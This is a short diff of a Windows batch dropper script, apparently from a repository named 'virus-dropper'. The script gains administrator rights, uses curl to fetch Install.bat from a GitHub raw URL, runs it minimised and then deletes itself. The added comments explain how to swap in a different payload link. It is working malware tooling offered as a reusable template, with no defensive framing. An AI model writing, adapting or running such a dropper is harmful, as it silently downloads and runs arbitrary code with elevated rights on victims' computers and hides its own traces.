@@ -21,7 +21,12 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
+    
+::Create a copy of install.bat, and edit items inside as directed
+::Edit this link to the DIRECT download link of the new install.bat
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Install.bat" --output "Install.bat"
+::do not change --output
+
 start /min Install.bat
 call :deleteSelf&exit
 :deleteSelf
